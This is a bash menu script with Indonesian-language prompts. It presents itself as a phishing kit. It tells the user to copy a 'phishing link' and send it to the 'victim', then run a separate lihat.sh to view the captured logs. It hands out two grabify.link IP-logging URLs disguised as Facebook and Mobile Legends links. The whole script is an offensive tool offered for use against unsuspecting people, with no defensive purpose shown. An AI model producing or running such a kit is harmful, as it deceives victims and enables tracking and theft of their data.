clear                                                               
bi='\033[34;1m' #biru
i='\033[32;1m' #ijo                                                 
pur='\033[35;1m' #purple                                            
cy='\033[36;1m' #cyan
me='\033[31;1m' #merah                                              
pu='\033[37;1m' #putih                                              
ku='\033[33;1m' #kuning
echo $pu""
figlet " WELLCOME"
echo
echo $cy"====================================="
echo $pur" PILIH LINK PHISING YANG SUDAH TERSEDIA"
echo $pur" COPY, LALU KIRIMKAN KE KORBAN"
echo $pur" JIKA LOG BERJALAN,BERARTI  KORBAN SUDAH MASUK LINK"
echo $pur" BUKA TAB BARU, JALANKAN"$cy" lihat.sh" $pur"UNTUK MELIHAT HASILNYA"
echo $cy"====================================="
echo $pur"|"" GENERATE LINK                     "$pur"|"
echo $pur"|""                                   "$pur"|"
echo $pur"|"$cy"["$i"1"$cy"]"$i" FACEBOOK LINK                  "$pur"|"
echo $pur"|"$cy"["$i"2"$cy"]"$i" MOBILE LEGENDS LINK            "$pur"|"
echo $pur"|"$cy"["$i"3"$cy"]"$i" EXIT                           "$pur"|"
echo $cy"====================================="
echo
echo $cy"╭─["$ku"Pilih"$cy"]"
read -p"╰─>> " pil
if [ $pil = 1 ]
then
echo
echo
echo $me"LINK UNTUK KORBAN :"
echo $cy"__________________"
echo
echo
echo $cy"≠≠≠≠≠≠≠"$ku" https://grabify.link/G47RI3"$cy" ≠≠≠≠≠≠≠"
echo
sleep 2
fi

if [ $pil = 2 ]
then
echo
echo
echo $me"LINK UNTUK KORBAN :"
echo $cy"__________________"
echo
echo
echo $cy"======"$ku" https://grabify.link/26UJ9B"$cy" ======"
echo
sleep 2
fi

if [ $pil = 3 ]
then
echo
echo $pu""
toilet -f future THANK YOU
echo
fi
